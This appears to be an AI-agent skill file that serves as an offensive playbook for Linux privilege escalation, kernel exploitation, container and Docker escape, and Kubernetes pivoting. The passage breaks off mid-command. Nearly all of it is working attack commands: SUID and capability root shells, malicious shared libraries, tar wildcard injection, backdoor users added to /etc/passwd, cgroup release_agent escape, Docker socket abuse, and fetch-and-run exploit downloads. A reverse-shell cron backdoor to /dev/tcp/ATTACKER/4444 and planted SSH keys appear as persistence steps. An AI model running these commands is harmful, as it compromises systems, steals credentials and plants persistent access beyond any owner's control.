---
name: privesc-linux
description: >-
  Linux complete privilege escalation chain. Covers local privesc (SUID/capabilities/kernel exploits/cron/sudo), container escape (Docker socket/cgroup/privileged mode), security mechanism bypass (SELinux/AppArmor/seccomp/noexec), lateral movement (SSH hijack/credential reuse), and Kubernetes exploitation (RBAC abuse/kubelet API/pod escape). Load when you have a Linux shell and need to escalate or pivot.
---

<!-- src: hacker/.claude/skills/privesc-linux/SKILL.md -->

# Linux Privilege Escalation — Complete Attack Chain

## Internal Navigation

| Section | Content |
|---|---|
| Part 1 | Local Privilege Escalation (SUID/sudo/cron/kernel) |
| Part 2 | Kernel Exploits Checklist |
| Part 3 | SUID & Capabilities Tricks |
| Part 4 | Container Escape Techniques |
| Part 5 | Docker Escape Chains |
| Part 6 | Linux Security Bypass (SELinux/AppArmor/seccomp) |
| Part 7 | Lateral Movement |
| Part 8 | Kubernetes Pentesting |

---

# Part 1: Local Privilege Escalation


## 1. ENUMERATION CHECKLIST

Run these immediately after landing a shell:

### System Info

```bash
uname -a                        # Kernel version
cat /etc/os-release             # Distro and version
cat /proc/version               # Kernel compile info
hostname && id && whoami        # Current context
```

### Sudo & SUID/SGID

```bash
sudo -l                         # What can we run as root?
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
find / -perm -2000 -type f 2>/dev/null   # SGID binaries
getcap -r / 2>/dev/null         # Files with capabilities
```

### Cron & Timers

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
systemctl list-timers --all     # systemd timers
```

### Writable Files & Dirs

```bash
find / -writable -type f 2>/dev/null | grep -v proc
ls -la /etc/passwd /etc/shadow  # Check permissions
find / -perm -o+w -type d 2>/dev/null   # World-writable dirs
```

### Network & Services

```bash
ss -tlnp                        # Listening services
cat /proc/net/tcp               # Raw TCP connections
ps aux                          # Running processes
env                             # Environment variables (credentials?)
```

### Credential Locations

```bash
cat ~/.bash_history
cat ~/.mysql_history
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | head -30
find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
```

---

## 2. SUID/SGID EXPLOITATION

### GTFOBins Methodology

1. Find SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
2. Cross-reference each with [GTFOBins](https://gtfobins.github.io/)
3. Use the "SUID" section specifically — not all binary abuse works with SUID

### Quick-Win SUID Escalations

| Binary | Command |
|---|---|
| `bash` | `bash -p` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `vim` | `vim -c ':!/bin/sh'` |
| `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `env` | `env /bin/sh -p` |
| `nmap` (old) | `nmap --interactive` → `!sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh -p")}'` |
| `less` | `less /etc/passwd` → `!/bin/sh` |
| `cp` | Copy `/etc/passwd`, add root user, copy back |

### Shared Library Hijacking (SUID Binary)

```bash
ldd /usr/local/bin/suid_binary                    # Check loaded libraries
strace /usr/local/bin/suid_binary 2>&1 | grep -i "open.*\.so"  # Find load paths

# If it loads from a writable directory — inject constructor:
gcc -shared -fPIC -o /writable/path/libevil.so evil.c
# evil.c: __attribute__((constructor)) → setuid(0); system("/bin/bash -p")
```

---

## 3. CAPABILITIES ABUSE

| Capability | Risk | Exploitation |
|---|---|---|
| `cap_setuid` | **Critical** | `python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'` |
| `cap_dac_override` | **Critical** | Read/write any file regardless of permissions |
| `cap_dac_read_search` | **High** | Read any file — dump `/etc/shadow` |
| `cap_sys_admin` | **Critical** | Mount filesystems, BPF, namespace manipulation |
| `cap_sys_ptrace` | **High** | Inject into root processes via ptrace |
| `cap_net_raw` | **Medium** | Sniff traffic, ARP spoofing |
| `cap_net_bind_service` | **Low** | Bind to privileged ports (<1024) |
| `cap_fowner` | **High** | Change ownership of any file |

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Example: python3 with cap_setuid
# /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## 4. CRON / TIMER ABUSE

### Writable Cron Scripts

```bash
# Find cron jobs running as root
cat /etc/crontab | grep root
ls -la /etc/cron.d/

# If a root-owned cron runs a script writable by current user:
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /writable/script.sh
# Wait for cron → /tmp/bash -p
```

### PATH Hijacking in Cron

```bash
# If crontab has: PATH=/home/user:/usr/local/bin:/usr/bin
# And runs: * * * * * root backup.sh (without full path)
# Create /home/user/backup.sh:
echo '#!/bin/bash' > /home/user/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/backup.sh
chmod +x /home/user/backup.sh
```

### Wildcard Injection (tar)

```bash
# If cron runs: tar czf /backup/archive.tar.gz *
# In the target directory, create:
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"
# tar interprets filenames as arguments
```

### pspy — Monitor Processes Without Root

```bash
# Upload pspy64 or pspy32 to target
./pspy64
# Watch for cron jobs, services, and background processes
```

---

## 5. NFS NO_ROOT_SQUASH

```bash
# On attacker: check exported shares
showmount -e TARGET_IP

# If no_root_squash is set:
mount -t nfs TARGET_IP:/share /mnt/nfs
# As root on attacker box:
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# On target:
/share/bash -p    # root shell
```

---

## 6. WRITABLE /etc/passwd OR /etc/shadow

### Writable /etc/passwd

```bash
# Generate password hash
openssl passwd -1 -salt xyz password123
# → $1$xyz$...hash...

# Append root-equivalent user
echo 'hacker:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd

# Or replace root's 'x' with generated hash (if no shadow file)
```

### Writable /etc/shadow

```bash
# Generate SHA-512 hash
mkpasswd -m sha-512 password123

# Replace root's hash in /etc/shadow
```

---

## 7. LD_PRELOAD / LD_LIBRARY_PATH WITH SUDO

```bash
# If sudo -l shows: env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
# Compile .so with _init() that calls setresuid(0,0,0) + system("/bin/bash -p")
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so /usr/bin/some_allowed_binary
```

---

## 8. DOCKER GROUP → ROOT

```bash
# If current user is in the docker group:
id    # check for "docker" in groups

# Mount host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Or add SSH key
docker run -v /root:/mnt --rm -it alpine sh -c \
  'echo "ssh-rsa AAAA..." >> /mnt/.ssh/authorized_keys'
```

---

## 9. PYTHON / PERL / RUBY LIBRARY HIJACKING

```bash
# Python: if a root-executed script does "import somelib"
# Check python path order:
python3 -c 'import sys; print("\n".join(sys.path))'

# Place malicious module in writable path that comes first:
cat > /writable/path/somelib.py << 'EOF'
import os
os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")
EOF

# Perl: PERL5LIB / @INC manipulation
# Ruby: RUBYLIB / $LOAD_PATH manipulation
```

---

## 10. AUTOMATED TOOLS

| Tool | Purpose | Command |
|---|---|---|
| **LinPEAS** | Comprehensive enumeration | `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \| sh` |
| **linux-exploit-suggester** | Kernel exploit suggestions | `./linux-exploit-suggester.sh` |
| **pspy** | Monitor processes (no root needed) | `./pspy64` |
| **LinEnum** | Legacy enumeration | `./LinEnum.sh -t` |
| **GTFOBins** | SUID/sudo/capability abuse reference | https://gtfobins.github.io/ |

---

## 11. PRIVILEGE ESCALATION DECISION TREE

```
Low-privilege shell obtained
│
├── sudo -l shows entries?
│   ├── GTFOBins match? → exploit directly
│   ├── env_keep has LD_PRELOAD? → LD_PRELOAD hijack (§7)
│   ├── NOPASSWD on custom script? → review script for injection
│   └── (ALL) with password? → check for password reuse/hashes
│
├── SUID/SGID binaries found?
│   ├── Standard binary on GTFOBins? → SUID exploit (§2)
│   ├── Custom binary? → reverse engineer, check libs (strace/ltrace)
│   └── Shared lib from writable path? → library hijack (§2)
│
├── Capabilities on binaries?
│   ├── cap_setuid? → instant root (§3)
│   ├── cap_dac_override? → write /etc/passwd (§6)
│   ├── cap_sys_admin? → mount / namespace tricks
│   └── cap_sys_ptrace? → process injection
│
├── Cron jobs running as root?
│   ├── Writable script? → inject payload (§4)
│   ├── Missing full path? → PATH hijack (§4)
│   └── Uses wildcards? → wildcard injection (§4)
│
├── Writable sensitive files?
│   ├── /etc/passwd writable? → add root user (§6)
│   ├── /etc/shadow writable? → replace root hash (§6)
│   └── systemd unit files writable? → add ExecStartPre
│
├── Docker/LXD group membership?
│   └── Yes → mount host filesystem (§8)
│
├── NFS shares with no_root_squash?
│   └── Yes → SUID binary via NFS (§5)
│
├── Kernel version old/unpatched?
│   └── Check KERNEL_EXPLOITS_CHECKLIST.md
│
└── None of the above?
    ├── Run LinPEAS for comprehensive scan
    ├── Check for password reuse (bash_history, config files)
    ├── Check internal services (127.0.0.1 listeners)
    └── Monitor processes with pspy for hidden opportunities
```


---

# Part 2: Kernel Exploits Checklist


## 2. EXPLOIT COMPILATION TIPS

### 2.1 On-Target Compilation

```bash
# Check if gcc/cc is available
which gcc cc

# Simple compilation
gcc exploit.c -o exploit -static
# -static: include all libraries — avoids version mismatch

# If no gcc, check for alternatives:
which musl-gcc    # Alpine/minimal systems
which clang
which tcc         # Tiny C Compiler
```

### 2.2 Cross-Compilation (on Attacker Box)

```bash
# For x86_64 target:
gcc -static -o exploit_x64 exploit.c

# For x86 (32-bit) target:
gcc -m32 -static -o exploit_x86 exploit.c

# For ARM (Raspberry Pi, embedded):
arm-linux-gnueabihf-gcc -static -o exploit_arm exploit.c

# For AARCH64:
aarch64-linux-gnu-gcc -static -o exploit_arm64 exploit.c

# For MIPS (routers, IoT):
mipsel-linux-gnu-gcc -static -o exploit_mips exploit.c

# Install cross-compilers (Debian/Ubuntu):
apt install gcc-arm-linux-gnueabihf gcc-aarch64-linux-gnu gcc-mipsel-linux-gnu
```

### 2.3 Musl Static Linking (Smallest Binaries)

```bash
# Install musl cross-compiler
apt install musl-tools

# Compile static binary with musl (much smaller than glibc static)
musl-gcc -static -o exploit exploit.c
```

### 2.4 Go / Rust Exploits (Pre-Compiled)

```bash
# Many modern exploits are in Go — compile statically:
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o exploit .

# Rust:
RUSTFLAGS='-C target-feature=+crt-static' cargo build --release --target x86_64-unknown-linux-musl
```

---

## 3. KERNEL EXPLOIT STABILITY NOTES

### 3.1 Stability Tiers

| Tier | Description | Examples |
|---|---|---|
| **Tier 1 — Reliable** | Deterministic, no race, works consistently | DirtyPipe, PwnKit, GameOver(lay) |
| **Tier 2 — Usually Works** | Minor timing or heap layout dependency | DirtyCow (madvise), Baron Samedit, Looney Tunables |
| **Tier 3 — Fragile** | Heap spraying, race-dependent, may crash | nf_tables (older), AF_PACKET, io_uring variants |

### 3.2 Pre-Exploit Checklist

```
Before running a kernel exploit:
│
├── 1. Verify kernel version matches exactly
│   ├── uname -r
│   ├── cat /proc/version
│   └── Compare with exploit's documented range
│
├── 2. Check architecture
│   ├── uname -m       # x86_64, aarch64, armv7l
│   └── file /bin/ls   # ELF 64-bit / 32-bit
│
├── 3. Check distro-specific patches
│   ├── Ubuntu/Debian: dpkg -l linux-image-$(uname -r)
│   ├── RHEL/CentOS: rpm -q kernel-$(uname -r)
│   └── Backported fixes may not change version number!
│
├── 4. Assess stability risk
│   ├── Tier 1 → safe to run
│   ├── Tier 2 → run, may need 2-3 attempts
│   └── Tier 3 → run only as last resort; may crash/panic
│
├── 5. Verify security modules
│   ├── SELinux: getenforce / sestatus
│   ├── AppArmor: aa-status / cat /sys/module/apparmor/parameters/enabled
│   └── seccomp: grep Seccomp /proc/self/status
│
└── 6. Set up persistence BEFORE running (in case of crash)
    ├── SSH key in ~/.ssh/authorized_keys
    ├── Reverse shell cron job
    └── Save current shell state
```

### 3.3 Common Failure Modes

| Failure | Cause | Mitigation |
|---|---|---|
| Kernel panic / reboot | Race condition lost, memory corruption | Use Tier 1 exploits first; retry with modified parameters |
| `Operation not permitted` | SELinux/AppArmor blocking | Check security module status; try bypass techniques |
| `No such file or directory` | Missing kernel feature (io_uring, nftables) | `ls /proc/sys/` or `lsmod` to verify feature availability |
| Exploit runs but no root | Distro backported patch | Check package version, not just kernel version |
| `SIGKILL` during exploit | seccomp filter killing syscalls | Check `/proc/self/status` Seccomp field |

---

## 4. SPECIFIC EXPLOIT QUICK REFERENCES

### 4.1 DirtyPipe (CVE-2022-0847)

```bash
# Check: kernel 5.8 – 5.16.10
uname -r

# Exploit (overwrite /etc/passwd):
./dirtypipe /etc/passwd 1 '${root_line}'
# Or use the SUID variant: overwrites a SUID binary temporarily
./dirtypipez    # automated — spawns root shell

# Very stable — no race condition, uses splice()
```

### 4.2 PwnKit (CVE-2021-4034)

```bash
# Check: pkexec must be SUID (almost always is)
ls -la /usr/bin/pkexec

# Exploit:
# Most public PoCs are single-command:
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit && ./PwnKit

# Or compile from source:
gcc cve-2021-4034.c -o pwnkit
./pwnkit
```

### 4.3 GameOver(lay) (CVE-2023-2640 + CVE-2023-32629)

```bash
# Ubuntu-specific (5.15 – 6.2 Ubuntu kernels)
# One-liner:
unshare -rm sh -c "
  mkdir l u w m &&
  cp /u*/b*/p]asswd l/;
  setcap cap_setuid+eip l/passwd;
  mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &&
  touch m/*;" &&
u/passwd
```

### 4.4 DirtyCow (CVE-2016-5195)

```bash
# Check: kernel < 4.8.3
uname -r

# Preferred variant (madvise — more stable):
gcc -pthread dirtycow-mem.c -o dcow -lcrypt
./dcow
# Modifies /etc/passwd in memory; may need revert after

# IMPORTANT: some variants can cause system instability
# Always prefer the madvise variant over the write() variant
```

### 4.5 Baron Samedit (CVE-2021-3156)

```bash
# Check sudo version:
sudo --version
# Vulnerable: 1.8.2 – 1.8.31p2, 1.9.0 – 1.9.5p1

# Quick test (should trigger error, not usage):
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# If "malloc(): memory corruption" → likely vulnerable

# Compile and run exploit (multiple variants available)
```

---

## 5. AUTOMATED KERNEL EXPLOIT SUGGESTION

```bash
# linux-exploit-suggester (shell script — no compilation needed)
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# linux-exploit-suggester-2 (Perl)
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
perl linux-exploit-suggester-2.pl

# LinPEAS also checks for kernel exploits
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```


---

# Part 3: SUID & Capabilities Tricks


## 2. CAPABILITY-SPECIFIC EXPLOITATION

### 2.1 cap_setuid (Most Dangerous)

Any binary with this capability can change its UID to 0.

```bash
# Python
/usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl
/usr/bin/perl = cap_setuid+ep
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# PHP
/usr/bin/php = cap_setuid+ep
php -r 'posix_setuid(0); system("/bin/bash");'

# Ruby
/usr/bin/ruby = cap_setuid+ep
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# Node.js
/usr/bin/node = cap_setuid+ep
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'
```

### 2.2 cap_dac_override (Bypass File Permissions)

Can read/write ANY file regardless of ownership/permissions.

```bash
# If vim has cap_dac_override:
vim /etc/shadow          # Read and edit shadow file
vim /etc/passwd          # Add root-level user
vim /root/.ssh/authorized_keys   # Plant SSH key

# If python has cap_dac_override:
python3 -c '
f = open("/etc/shadow"); print(f.read())
'
# Or write:
python3 -c '
with open("/etc/passwd","a") as f:
    f.write("hacker:$1$xyz$hash:0:0::/root:/bin/bash\n")
'
```

### 2.3 cap_dac_read_search (Read Any File)

```bash
# If tar has cap_dac_read_search:
tar czf /tmp/shadow.tar.gz /etc/shadow
tar xzf /tmp/shadow.tar.gz -C /tmp/

# If base64 has it:
base64 /etc/shadow | base64 -d
```

### 2.4 cap_sys_admin (Mount, BPF, Namespaces)

```bash
# Mount host filesystem (in a container context)
mkdir /mnt/host
mount /dev/sda1 /mnt/host
# Full host access

# Abuse via unshare (create user namespace, remap UID)
unshare -r /bin/bash
# Now root inside the namespace
```

### 2.5 cap_sys_ptrace (Process Injection)

```bash
# Inject into a root process
python3 << 'PYEOF'
import ctypes, sys

libc = ctypes.CDLL("libc.so.6")
PTRACE_ATTACH = 16
PTRACE_POKETEXT = 4
PTRACE_DETACH = 17

pid = int(sys.argv[1])  # PID of root process
libc.ptrace(PTRACE_ATTACH, pid, 0, 0)
# ... inject shellcode into process memory ...
PYEOF

# Simpler: use gdb if available
gdb -p <root_pid> -batch -ex 'call system("chmod +s /bin/bash")'
```

### 2.6 cap_net_raw (Network Sniffing)

```bash
# If tcpdump has cap_net_raw:
tcpdump -i eth0 -w /tmp/capture.pcap -c 1000

# If python has cap_net_raw:
# Use scapy to sniff credentials
python3 -c '
from scapy.all import *
sniff(filter="tcp port 80", prn=lambda p: p.show(), count=50)
'
```

### 2.7 cap_fowner (Change File Ownership)

```bash
# Change ownership of /etc/shadow to current user
python3 -c 'import os; os.chown("/etc/shadow", 1000, 1000)'
# Now read/modify shadow as normal user
```

### 2.8 cap_chown (Change Ownership of Any File)

```bash
# Similar to cap_fowner — take ownership of sensitive files
chown $(id -u):$(id -g) /etc/shadow
```

---

## 3. CUSTOM SUID BINARY EXPLOITATION

### 3.1 Methodology

```
Custom SUID binary found?
│
├── 1. Identify the binary type
│   ├── file /path/to/binary          → ELF? script wrapper?
│   └── strings /path/to/binary       → find hardcoded paths, commands
│
├── 2. Analyze behavior
│   ├── strace /path/to/binary 2>&1   → syscalls (open, exec, access)
│   ├── ltrace /path/to/binary 2>&1   → library calls (system, popen)
│   └── Run with various inputs       → observe behavior
│
├── 3. Find injection vectors
│   ├── Calls system()/popen() with user input? → command injection
│   ├── Opens files from PATH? → PATH hijack
│   ├── Loads shared libs from writable dir? → lib hijack
│   ├── Reads config from writable location? → config poisoning
│   └── Uses relative paths for commands? → PATH hijack
│
└── 4. Exploit
    ├── PATH hijack: export PATH=/tmp:$PATH; create /tmp/<command>
    ├── Lib hijack: place evil .so in writable RPATH/RUNPATH
    ├── Command injection: inject shell metacharacters
    └── Race condition: TOCTOU on checked files
```

### 3.2 PATH Hijacking Example

```bash
# Binary runs "service apache2 restart" (relative path)
strings /usr/local/bin/suid_binary | grep service

# Create malicious "service" in PATH
echo '#!/bin/bash' > /tmp/service
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH

# Execute the SUID binary
/usr/local/bin/suid_binary
# → /tmp/bash -p
```

### 3.3 Shared Library Hijacking via RPATH/RUNPATH

```bash
# Check RPATH/RUNPATH
readelf -d /usr/local/bin/suid_binary | grep -i path
# RUNPATH: /home/user/lib

# Check what libraries it needs
ldd /usr/local/bin/suid_binary
# libcustom.so => not found

# Create malicious library
cat > /tmp/evil.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>
static void pwn() __attribute__((constructor));
void pwn() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o /home/user/lib/libcustom.so /tmp/evil.c

# Run the SUID binary → root shell
```

### 3.4 TOCTOU Race Condition

```bash
# If SUID binary checks file permission then reads it:
# access("/tmp/userfile", R_OK) → open("/tmp/userfile")

# Race: swap file between check and open
while true; do
    ln -sf /home/user/allowed.txt /tmp/userfile
    ln -sf /etc/shadow /tmp/userfile
done &

# Repeatedly run the SUID binary
while true; do
    /usr/local/bin/suid_binary /tmp/userfile 2>/dev/null | grep root && break
done
```

---

## 4. QUICK-REFERENCE: CAPABILITIES → EXPLOITATION

| Capability | Attack Type | Impact |
|---|---|---|
| `cap_setuid+ep` | Direct UID change | **Root shell** |
| `cap_setgid+ep` | Direct GID change | **Root group** |
| `cap_dac_override+ep` | Read/write any file | **Shadow/passwd edit** |
| `cap_dac_read_search+ep` | Read any file | **Credential dump** |
| `cap_sys_admin+ep` | Mount, BPF, namespace | **Host filesystem** |
| `cap_sys_ptrace+ep` | Process injection | **Root process hijack** |
| `cap_sys_module+ep` | Load kernel modules | **Kernel rootkit** |
| `cap_net_raw+ep` | Raw sockets | **Credential sniffing** |
| `cap_fowner+ep` | Change file ownership | **Shadow ownership** |
| `cap_chown+ep` | Change any ownership | **Same as fowner** |
| `cap_kill+ep` | Signal any process | **DoS / race conditions** |
| `cap_net_bind_service+ep` | Bind port <1024 | **Service impersonation** |


---

# Part 4: Container Escape Techniques


## 1. AM I IN A CONTAINER?

```bash
# Quick checks
cat /proc/1/cgroup 2>/dev/null | grep -qi "docker\|kubepods\|containerd"
ls -la /.dockerenv 2>/dev/null
cat /proc/self/mountinfo | grep -i "overlay\|docker\|kubelet"
hostname    # random hex = likely container

# Detailed check
cat /proc/1/status | head -5   # PID 1 is not systemd/init?
mount | grep -i "overlay"      # overlay filesystem?
ip addr                         # veth interface? limited NICs?
```

### Tools for Container Detection

```bash
# amicontained: shows container runtime, capabilities, seccomp
./amicontained

# deepce: Docker enumeration and exploit suggester
./deepce.sh

# CDK: all-in-one container pentesting toolkit
./cdk evaluate
```

---

## 2. PRIVILEGED CONTAINER ESCAPE

If `--privileged` flag was used, the container has nearly all host capabilities and device access.

### 2.1 Mount Host Filesystem

```bash
# Check if privileged
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = fully privileged

# Find host disk
fdisk -l 2>/dev/null || lsblk
# Usually /dev/sda1 or /dev/vda1

# Mount host root
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host

# Access host filesystem
cat /mnt/host/etc/shadow
chroot /mnt/host bash
```

### 2.2 nsenter (Enter Host Namespaces)

```bash
# From privileged container, enter host PID 1's namespaces
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# This gives a shell in the host's namespace context
# Effectively a full host shell
```

### 2.3 Privileged + Host PID Namespace

```bash
# If hostPID: true is set (Kubernetes)
# Access host processes via /proc
ls /proc/1/root/     # Host root filesystem
cat /proc/1/root/etc/shadow

# Inject into host process
nsenter --target 1 --mount -- bash
```

---

## 3. CAPABILITY-BASED ESCAPE

### 3.1 CAP_SYS_ADMIN — Most Versatile

```bash
# Check capabilities
capsh --print 2>/dev/null
grep CapEff /proc/self/status

# Escape via mounting
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
# Or mount host filesystem if device access exists
mount /dev/sda1 /mnt/host 2>/dev/null
```

### 3.2 CAP_SYS_PTRACE — Process Injection

```bash
# Inject shellcode into a host process (requires host PID namespace)
# Find a root process
ps aux | grep root

# Use gdb or python-ptrace to inject
python3 << 'EOF'
import ctypes
import ctypes.util

libc = ctypes.CDLL(ctypes.util.find_library("c"))

# Attach to host process, inject shellcode
# ... (full inject_shellcode implementation)
EOF
```

### 3.3 CAP_NET_ADMIN

```bash
# Manipulate host network if host network namespace is shared
# ARP spoofing, route manipulation, traffic interception
iptables -L            # Can see/modify host firewall rules?
ip route               # Can modify routing?
```

### 3.4 CAP_DAC_READ_SEARCH (Shocker Exploit)

```bash
# open_by_handle_at() bypass — read files from host
# Compile and run the "shocker" exploit
# Works when DAC_READ_SEARCH capability is granted
gcc shocker.c -o shocker
./shocker /etc/shadow   # Read host file
```

---

## 4. DOCKER SOCKET ESCAPE (/var/run/docker.sock)

```bash
ls -la /var/run/docker.sock   # Check if mounted

# With Docker CLI:
docker run -v /:/host --privileged -it alpine chroot /host bash

# Without CLI (curl only) — create privileged container via API:
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Tty":true,"OpenStdin":true,
       "HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
# Start → Exec chroot /host bash (see DOCKER_ESCAPE_CHAINS.md for full sequence)
```

---

## 5. CGROUP V1 RELEASE_AGENT ESCAPE

Classic escape for containers with CAP_SYS_ADMIN + cgroup v1.

```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/w && echo 1 > $d/w/notify_on_release
host_path=$(sed -n 's/.*\bperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent

cat > /cmd << 'EOF'
#!/bin/sh
cat /etc/shadow > /output 2>&1       # Or: reverse shell
EOF
chmod +x /cmd

sh -c "echo \$\$ > $d/w/cgroup.procs" && sleep 1
cat /output
```

---

## 6. CGROUP V2 / eBPF ESCAPE

```bash
# Cgroup v2: no release_agent file
# Check cgroup version:
mount | grep cgroup
# cgroup2 → v2

# eBPF-based escape (requires CAP_SYS_ADMIN + CAP_BPF or equivalent)
# Kernel ≥ 5.8 with unprivileged eBPF enabled
cat /proc/sys/kernel/unprivileged_bpf_disabled
# 0 = eBPF available to unprivileged users
```

---

## 7. NAMESPACE ESCAPE

### User Namespace

```bash
# If user namespace creation is allowed inside container:
unshare -U --map-root-user bash
# Now "root" inside new namespace
# Combined with other capabilities → mount host filesystem
```

### PID Namespace Escape

```bash
# If hostPID: true (shared PID namespace with host)
# Access host processes directly:
ls /proc/1/root/          # Host's root filesystem
cat /proc/1/root/etc/shadow

# Inject into host process:
nsenter -t 1 -m -u -i -n -p -- bash
```

---

## 8. RUNTIME VULNERABILITIES

### runc CVE-2019-5736

Overwrites host runc binary when `docker exec` is used.

```bash
# Conditions: docker exec into a malicious container triggers exploit
# The container's /bin/sh is replaced with exploit binary
# When next exec happens → overwrites /usr/bin/runc on host

# PoC: modify entrypoint to overwrite runc
# This is a one-shot exploit — runc is replaced permanently
```

### containerd CVE-2020-15257

```bash
# Host network namespace shared + containerd < 1.3.9 / 1.4.3
# Abstract Unix socket accessible from container
# Connect to containerd shim API via @/containerd-shim/*.sock
```

### cgroups CVE-2022-0492

```bash
# Unpatched kernel allows cgroup escape without CAP_SYS_ADMIN
# release_agent writable by unprivileged user in container
```

---

## 9. KUBERNETES POD ESCAPE

| Dangerous Pod Spec | Escape |
|---|---|
| `hostPID: true` | `nsenter -t 1 -m -u -i -n -p -- bash` |
| `hostNetwork: true` | Access node services (Kubelet, etcd) directly |
| `hostPath: {path: /}` | `chroot /host bash` |
| `privileged: true` | Mount host disk / nsenter |
| SA token with RBAC | Create new privileged pod via API |

See [kubernetes-pentesting](../kubernetes-pentesting/SKILL.md) for full K8s attack paths.

---

## 10. TOOLS

| Tool | Purpose | URL/Command |
|---|---|---|
| **deepce** | Docker enumeration + exploit suggestions | `./deepce.sh` |
| **CDK** | Container/K8s exploitation toolkit | `./cdk evaluate` |
| **amicontained** | Show container runtime, caps, seccomp | `./amicontained` |
| **PEIRATES** | Kubernetes penetration testing | `./peirates` |
| **BOtB** | Break out the Box — auto-escape | `./botb -autopwn` |

---

## 11. CONTAINER ESCAPE DECISION TREE

```
Inside a container?
│
├── Privileged mode? (CapEff = 0000003fffffffff)
│   ├── Yes → mount host disk (§2.1) or nsenter (§2.2)
│   └── Partial capabilities? Check each:
│       ├── CAP_SYS_ADMIN → cgroup release_agent (§5) or mount (§3.1)
│       ├── CAP_SYS_PTRACE + hostPID → process injection (§3.2)
│       ├── CAP_DAC_READ_SEARCH → shocker exploit (§3.4)
│       └── CAP_NET_ADMIN + hostNetwork → network manipulation (§3.3)
│
├── Docker socket mounted? (/var/run/docker.sock)
│   └── Yes → create privileged container (§4)
│
├── Host PID namespace shared?
│   └── Yes → nsenter -t 1 or /proc/1/root access (§7)
│
├── Cgroup v1?
│   └── + CAP_SYS_ADMIN → release_agent escape (§5)
│
├── Runtime vulnerable?
│   ├── runc < 1.0.0-rc6 → CVE-2019-5736 (§8)
│   └── containerd < 1.3.9 → CVE-2020-15257 (§8)
│
├── Kernel vulnerable?
│   └── Check KERNEL_EXPLOITS_CHECKLIST in linux-privilege-escalation
│
├── Kubernetes pod?
│   ├── Service account with elevated RBAC? → create escape pod (§9)
│   └── hostPath volume? → access host filesystem
│
└── None of the above?
    ├── Run deepce/CDK for automated detection
    ├── Check for writable host mount points
    ├── Enumerate network for other containers/services
    └── Check /proc/self/mountinfo for interesting mounts
```


---

# Part 5: Docker Escape Chains


## 2. ESCAPE CHAIN: DOCKER SOCKET → HOST ROOT

### 2.1 With Docker CLI Available

```bash
# Step 1: Confirm socket access
ls -la /var/run/docker.sock
docker ps    # list running containers

# Step 2: Launch privileged escape container
docker run -d --privileged --pid=host \
  -v /:/hostfs \
  --name escape alpine sleep 3600

# Step 3: Exec into escape container
docker exec -it escape chroot /hostfs bash

# Step 4: Persistence
echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys
# Or add cron backdoor:
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /etc/crontab

# Step 5: Cleanup
exit
docker rm -f escape
```

### 2.2 Without Docker CLI (curl Only)

```bash
# Step 1: List images available on host
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json \
  | python3 -c "import sys,json; [print(i['RepoTags']) for i in json.load(sys.stdin)]"

# Step 2: Create container
CONTAINER_ID=$(curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
